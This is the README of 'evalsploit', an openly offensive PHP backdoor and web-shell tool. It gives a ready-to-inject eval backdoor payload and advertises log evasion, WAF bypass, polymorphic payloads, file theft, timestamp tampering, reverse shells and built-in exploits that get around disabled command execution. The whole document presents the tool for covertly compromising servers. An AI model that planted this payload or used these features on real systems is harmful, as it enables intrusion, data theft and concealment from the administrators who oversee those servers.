# [evalsploit по-русски](README_RU.md)
# [evalsploit 中文版](README_CH.md) 

Okay, so, this text is for 2.6.0 #release.
New version works with generated parametrs, so use `gen` command first to get actual payload - workaround until 2.8.0 so be patient, please. Will do a sessions to fix. Thank you.
P.S. 
You can mutate payload in infected php using `mutate` comand, but other infected urls will not work due to the mutated parametrs (will fix it soon, dont worry)

# evalsploit
Backdoor based on the `eval` function. Can be used as standalone web-shell

### Features

-   **Stealth**
    -   Works on POST requests, practically invisible to logs
    -   Built-in WAF bypass
    -   New user agent every new session
    -   Stealth operation setting
    -   Polymorphic payloads 

-   **Universal**
    -   Payload can be injected in any part of the php code
    -   Suitable for working with servers on Linux, Windows, Mac OS

# Manual

#### Getting started

1) Use the payload to infect PHP or as an independent shell:
`if(isset($_POST['Z'])){@eval(base64_decode(str_replace($_POST['V'], '' ,$_POST['Z'])));die();}`
3) When starting the program, evalsploit will require a link to the file with the payload
4) When changing the `send` module (see "program setup"), use the `gen` command to generate a new payload

#### Working with the file system

-   `ls`: list of files in the directory
	-   Setting `ls`: based on the DirectoryIterator function (stands by default)
	-   Setting `dir`: based on the ScanDir function

-   `cp`: copying files
    -   Use the separator ` : ` (/what.txt : /where/what.txt )

-   `cd`: moving through the file system

-	`mkd`: create a new directory

-	`upl`: upload a file to the server

-	`home`: back to \_\_DIR\_\_

-	`pwd`: print the active directory

#### Working with files

-   `cat`: print the file contents
    -   Setting `html`: based on the htmlentities function
	-   Setting `base64`: based on the base64_encode\base64_decode function (set as default)

-   `rm`: delete file

-   `dl`: download file (to the /download folder)
	-	Does not work well with files larger than 100 MB
	
-   `edit`: edit file contents
	-	Does not work well with files larger than 100 MB

-	`mkf`: create new file

-	`touch`: change file datestamp
	-	Use the ` settime ` separator (file.рhр settime Year-Month-Day Hour:Minute:Second)

-	`stat`: file information

-	`ren`: rename file
	-	Use the separator ` : ` (/where/old.txt : new.php )


#### Working with the evalsploit system

-   `run`: switch to command line mode
	-	`exit` to exit the mode
	-	Supports exec, shell_exec, system, passthru, popen, proc_open, expect_popen, pcntl_exec, do
	
-	`info`: server informtion
	-	php version, OS
	
-	`scan`: scanning the selected directory
	-	Search for system PHP, databases, keys etc
	
-	`exploit`: bypassing disabled command line with built-in exploits, activates the command line mode
	-	`exit` to exit the mode

-	`reverse`: reverse-shell - `reverse IP:PORT`
	
-	`gen`: generating a payload depending on the send module
	
-	`help`: home screen
	
-	`exit`: exit
	
	
	
#### Program Setup

-	`set`: configuring modules. To view the list of parameters use `set module help`
	-	Instead of `help` acceptable `-h`, `h`, `?`, `/?`)
	-	**run**: `exec`, `shell_exec`, `system`, `passthru`, `popen`, `proc_open`, `expect_popen`, `pcntl_exec`, `do`
	-	**ls**: `ls`, `dir`
	-	**cat**: `html`, `base64`
	-	**silent**: `1`, `0` (Stealth)
	-	**reverse**: `ivan`, `monkey` 
	-	**send**: `bypass`, `classic`, `simple` (send mmodule)


### Thanks
Thanks to Zuo Yunfan for helping with the Chinese translation
